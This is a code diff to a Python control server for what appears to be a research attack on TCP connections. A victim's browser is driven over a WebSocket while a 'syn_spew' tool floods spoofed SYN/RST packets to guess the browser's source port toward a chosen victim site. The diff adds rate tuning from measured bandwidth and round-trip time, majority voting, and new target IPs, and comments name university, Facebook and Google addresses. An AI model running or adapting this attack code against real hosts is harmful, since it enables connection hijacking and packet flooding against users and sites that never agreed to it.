@@ -42,16 +42,18 @@ HIGH_PORT = 61000
 
 PORT_BUCKET_SIZE = (HIGH_PORT - LOW_PORT) / NUM_BUCKETS
 TEST_VICTIM_IP = '12.168.1.113'
+#VICTIM_SITE = '69.171.242.11' # facebook (can only use on campus)
+#VICTIM_SITE = '74.125.225.102' # google (can only use on campus)
 #VICTIM_SITE = '66.220.149.11'  # can't use non-umich because merit egress filters
 
 #VICTIM_SITE = '141.212.113.142' # sorry, cse.umich.edu
 
-#VICTIM_SITE = '141.212.109.163' # can't use things with -m state --state ESTABLISHED,RELATED, because it will send RST to SYN-ACK
+VICTIM_SITE = '141.212.109.163' # can't use things with -m state --state ESTABLISHED,RELATED, because it will send RST to SYN-ACK
 #VICTIM_SITE_IMG = 'http://%d-x-%d.x.hobocomp.com'
 
 
-VICTIM_SITE = '68.40.51.184' # hobocomp.com! (only usable when victim browser is on umich campus due to merit egress filters)
-VICTIM_SITE_IMG = 'http://%d-x-%d.hobocomp.com/'
+#VICTIM_SITE = '68.40.51.184' # hobocomp.com! (only usable when victim browser is on umich campus due to merit egress filters)
+#VICTIM_SITE_IMG = 'http://%d-x-%d.hobocomp.com/'
 
 #VICTIM_SITE = '23.21.237.114'   # factorable.net
 #VICTIM_SITE_IMG = 'http://%d-x-%d.f.hobocomp.com/'
@@ -60,6 +62,7 @@ NEW_CONNECTION_PERIOD = 0.4
 CONNECTION_TIMEOUT = 30.0
 SPEW_DELAY_US = '100'
 SPEW_TIME_MS  = '500'   # if you don't win the race in the first few seconds, you're not going to
+RTT = 50    # milliseconds
 
 class ControlWebSocket(Protocol):
     """
@@ -90,16 +93,35 @@ class ControlWebSocket(Protocol):
         #subprocess.call(['./syn_spew', '-p', '%d-%d' % (low_port, high_port), \
         #                 '-r', '100', '-d', '100', self.addr.host, '69.171.242.11:80'])
         os.execvp('./syn_spew', ['./syn_spew', '-b', '-p', '%d-%d' % (low_port, high_port), \
-                                '-t', SPEW_TIME_MS, '-d', SPEW_DELAY_US, self.addr.host, '%s:80' % (VICTIM_SITE)])
+                                '-t', SPEW_TIME_MS, '-d', self.SPEW_DELAY_US, self.addr.host, '%s:80' % (VICTIM_SITE)])
         #sys.exit(0)
 
 
     def getBucketPortRange(self):
-        high = LOW_PORT + (self.bucket + 1) * PORT_BUCKET_SIZE - 1
-        if self.bucket == (NUM_BUCKETS - 1):
+        high = LOW_PORT + (self.bucket + 1) * self.PORT_BUCKET_SIZE - 1
+        if self.bucket == (self.NUM_BUCKETS - 1):
             high = HIGH_PORT
-        low = LOW_PORT + self.bucket * PORT_BUCKET_SIZE
-        return (low, high)
+        low = LOW_PORT + self.bucket * self.PORT_BUCKET_SIZE
+        return (int(low), int(high))
+
+
+    def incrementBuckets(self):
+        """
+        Increases the bucket range by 1 (or more?)
+        TODO: deal with wrap around better - if we wrap, need to search for low
+        ports again 
+        """
+        # since the browser's source port will increment by one each guess,
+        # we'll increment here too.
+        self.min_port += 1
+        self.mid_port += 1
+        self.max_port += 1
+
+        if self.max_port > HIGH_PORT:
+            self.max_port = HIGH_PORT
+        if self.mid_port > HIGH_PORT:
+            self.mid_port = HIGH_PORT
+
 
 
     def adjustBucket(self, success):
@@ -115,7 +137,8 @@ class ControlWebSocket(Protocol):
             reactor.stop()
             return
 
-        if self.min_port == self.mid_port:
+        print 'adjust Bucket (%s, %s, %s)' % (self.min_port, self.mid_port, self.max_port)
+        if (self.min_port == self.mid_port):
             if success:
                 port = self.min_port
             else:
@@ -124,16 +147,23 @@ class ControlWebSocket(Protocol):
             self.transport.write("show <b>Used port %d</b>" % port) 
             reactor.stop()
             return
+        else:
+            print '(not equal)'
 
         if success:
             # Look left
-            self.min_port = self.min_port
-            self.max_port = self.mid_port
-            self.mid_port = (self.min_port + self.mid_port) / 2
+            self.min_port = int(self.min_port)
+            self.max_port = int(self.mid_port)
+            self.mid_port = int((self.min_port + self.mid_port) / 2)
         else:
-            self.min_port = self.mid_port
-            self.mid_port = (self.mid_port + self.max_port) / 2
-            self.max_port = self.max_port
+            # if we are really close (min==mid), when we lose, 
+            # we should increase the max by one
+            self.min_port = int(self.mid_port)
+            self.mid_port = int((self.mid_port + self.max_port) / 2)
+            self.max_port = int(self.max_port)
+            if (self.min_port == self.mid_port):
+                self.mid_port += 1
+                self.max_port += 1
 
             # chrome weirdness, when you lose, it skips a port
             # (something to do with Linux source port hints?)
@@ -141,19 +171,9 @@ class ControlWebSocket(Protocol):
             #self.mid_port += 1
             #self.max_port += 1
         
+        self.incrementBuckets()
 
-        # since the browser's source port will increment by one each guess,
-        # we'll increment here too.
-        self.min_port += 1
-        self.mid_port += 1
-        self.max_port += 1
-
-        if self.max_port > HIGH_PORT:
-            self.max_port = HIGH_PORT
-        if self.mid_port > HIGH_PORT:
-            self.mid_port = HIGH_PORT
-
-
+        
 
 
     def cleanupOldWebsocket(self):
@@ -166,7 +186,7 @@ class ControlWebSocket(Protocol):
             self.bucket_search = False
     
             (self.min_port, self.max_port) = self.getBucketPortRange() 
-            self.mid_port = (self.min_port + self.max_port) / 2
+            self.mid_port = int((self.min_port + self.max_port) / 2)
         else:
             self.adjustBucket(True)
         
@@ -260,14 +280,20 @@ class ControlWebSocket(Protocol):
                         # we lost, so we're
                         # still doing a linear search over buckets
                         self.bucket += 1
-                        if (self.bucket == NUM_BUCKETS):
+                        if (self.bucket == self.NUM_BUCKETS):
                             print 'Ah, well that is the game :('
                             reactor.stop()
                             return
 
             else:
                 # Doing binary search
-                self.adjustBucket(we_won)
+                self.votes.append(we_won)
+                if len(self.votes) >= 2:
+                    we_won = (True in self.votes)
+                    self.votes = []
+                    self.adjustBucket(we_won)
+                else:
+                    self.incrementBuckets()
 
             # Fire again
             if (self.fire_time != None):
@@ -275,10 +301,43 @@ class ControlWebSocket(Protocol):
                 
             reactor.callLater(NEW_CONNECTION_PERIOD, self.fireAgain)
 
-        elif data == 'calmed':
+        elif data.startswith('calmed'):
+            rtt_secs = float(data[len('calmed '):])
+            self.RTT = int(rtt_secs * 1000)
+            print 'RTT: %f (%d ms)' % (rtt_secs, self.RTT)
             # The browser has initialized itself and is ready to begin bucket search
+            # But first, we'll do a quick bandwidth test
+            # make the browser download a 10mb file from us and time how long it took
+            # to get it. That gives us a speed at which we can send packets at
             if (self.fire_time != None):
                 print 'diff: %f' % (time.time() - self.fire_time)
+
+            self.transport.write("bwtest 50mb.dat.jpg")
+
+        elif data.startswith('bwresult'):
+            bwresult = float(data[len('bwresult '):])
+            print 'Took %f seconds to download 10MB' % bwresult
+            bw = float(8*10*1024*1024) / bwresult
+            pps = bw / float(480)
+            pkt_delay = int(1000000.0 / pps)
+            print '%f mbps \n~= %f kpkts/sec \n~= %d us packet delay' % \
+                ((bw/float(1024*1024)), (pps/float(1000)), pkt_delay)
+            
+            self.SPEW_DELAY_US = str(pkt_delay + 5)
+    
+            # now calculate the other way:
+            pps = 1000000.0 / float(self.SPEW_DELAY_US) #packets per second
+            pps /= 2 # have to send both SYN and RST
+
+
+            port_guesses = float(pps * self.RTT) / 1000.0   # number of ports we can guess per RTT
+        
+
+            self.NUM_BUCKETS = ((HIGH_PORT - LOW_PORT) / port_guesses) + 1
+            self.PORT_BUCKET_SIZE = (HIGH_PORT - LOW_PORT) / self.NUM_BUCKETS
+            print 'moving to %d buckets' % self.NUM_BUCKETS
+            
+
             self.votes = []  # We will append to this a set of win/loss (True/False)
                              # until we get above VOTE_THRESHOLD, then move on to the
                              # next bucket, to increase reliability.
